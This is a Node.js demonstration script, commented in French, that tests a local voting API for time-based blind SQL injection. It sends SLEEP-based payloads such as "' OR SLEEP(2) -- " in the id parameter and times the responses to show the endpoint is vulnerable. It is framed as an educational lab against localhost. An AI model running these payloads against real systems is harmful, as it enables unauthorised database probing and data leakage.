const fetch = require('node-fetch');

const API_URL = 'http://localhost:3000/api';

// Fonction pour mesurer le temps de réponse
async function measureResponseTime(id, election) {
  const start = Date.now();
  
  try {
    const response = await fetch(`${API_URL}/vote/verify?id=${id}&election=${election}`);
    await response.json();
    const duration = Date.now() - start;
    return { duration, status: response.status };
  } catch (error) {
    return { duration: -1, status: 'error' };
  }
}

async function demonstrateTimingAttack() {
  console.log('\n🔓 DÉMONSTRATION: Time-based Blind SQLi\n');
  console.log('═'.repeat(60));
  
  // Test 1: Requête légitime
  console.log('\n📊 Test 1: Requêtes légitimes\n');
  
  const legitimateTests = [
    { id: 'user-001-alice', election: 'president-club-2025', label: 'Alice (a voté)' },
    { id: 'user-003-charlie', election: 'president-club-2025', label: 'Charlie (n\'a pas voté)' },
    { id: 'user-004-diana', election: 'president-club-2025', label: 'Diana (n\'a pas voté)' }
  ];

  console.log('ID Utilisateur              | Élection                  | Temps (ms)');
  console.log('-'.repeat(75));

  for (const test of legitimateTests) {
    const result = await measureResponseTime(test.id, test.election);
    console.log(`${test.label.padEnd(27)} | ${test.election.padEnd(25)} | ${result.duration}ms`);
  }

  // Test 2: Injection avec délai (SLEEP)
  console.log('\n📊 Test 2: Injection avec fonction SLEEP (preuve de concept)\n');
  console.log('⚠️  NOTE: Ce test montre que l\'endpoint est vulnérable à l\'injection SQL\n');
  
  const injectionTests = [
    {
      id: 'user-001-alice',
      election: 'president-club-2025',
      label: 'Requête normale'
    },
    {
      id: "user-001-alice' OR SLEEP(2) -- ",
      election: 'president-club-2025',
      label: 'Injection SLEEP(2)'
    },
    {
      id: "user-001-alice' OR SLEEP(0) -- ",
      election: 'president-club-2025',
      label: 'Injection SLEEP(0)'
    }
  ];

  console.log('Type de requête             | Temps attendu | Temps réel');
  console.log('-'.repeat(70));

  for (const test of injectionTests) {
    const result = await measureResponseTime(test.id, test.election);
    const expected = test.label.includes('SLEEP(2)') ? '~2000ms' : 
                     test.label.includes('SLEEP(0)') ? '<100ms' : '<100ms';
    console.log(`${test.label.padEnd(27)} | ${expected.padEnd(13)} | ${result.duration}ms`);
  }

  // Test 3: Analyse statistique
  console.log('\n📊 Test 3: Analyse statistique (10 requêtes chacune)\n');
  
  const normalId = 'user-001-alice';
  const injectedId = "user-001-alice' OR SLEEP(1) -- ";
  
  console.log('Collecte des données...\n');
  
  const normalTimes = [];
  const injectedTimes = [];
  
  for (let i = 0; i < 10; i++) {
    const normal = await measureResponseTime(normalId, 'president-club-2025');
    normalTimes.push(normal.duration);
    
    const injected = await measureResponseTime(injectedId, 'president-club-2025');
    injectedTimes.push(injected.duration);
  }
  
  const avgNormal = normalTimes.reduce((a, b) => a + b, 0) / normalTimes.length;
  const avgInjected = injectedTimes.reduce((a, b) => a + b, 0) / injectedTimes.length;
  
  console.log('Type               | Moy. (ms) | Min (ms) | Max (ms)');
  console.log('-'.repeat(60));
  console.log(`Requêtes normales  | ${avgNormal.toFixed(1).padEnd(9)} | ${Math.min(...normalTimes).toString().padEnd(8)} | ${Math.max(...normalTimes)}`);
  console.log(`Avec injection     | ${avgInjected.toFixed(1).padEnd(9)} | ${Math.min(...injectedTimes).toString().padEnd(8)} | ${Math.max(...injectedTimes)}`);
  console.log(`Différence         | ${(avgInjected - avgNormal).toFixed(1)}ms (${((avgInjected / avgNormal - 1) * 100).toFixed(0)}% plus lent)`);

  // Conclusion
  console.log('\n📌 CONCLUSION:\n');
  console.log('✗ L\'endpoint /api/vote/verify est VULNÉRABLE à l\'injection SQL');
  console.log('✗ Un attaquant peut injecter du code SQL (SLEEP, IF, etc.)');
  console.log('✗ Les différences de temps permettent d\'inférer des informations');
  console.log('✗ Impact: Fuite d\'informations sensibles par inférence temporelle\n');
  console.log('═'.repeat(60));
}

// Exécution
if (require.main === module) {
  console.log('\n⚠️  AVERTISSEMENT: Script de démonstration pédagogique');
  console.log('   Ce script démontre une vulnérabilité à des fins éducatives');
  console.log('   Assurez-vous que le serveur est démarré sur http://localhost:3000\n');
  
  demonstrateTimingAttack().catch(error => {
    console.error('\n❌ Erreur:', error.message);
  });
}

module.exports = { measureResponseTime };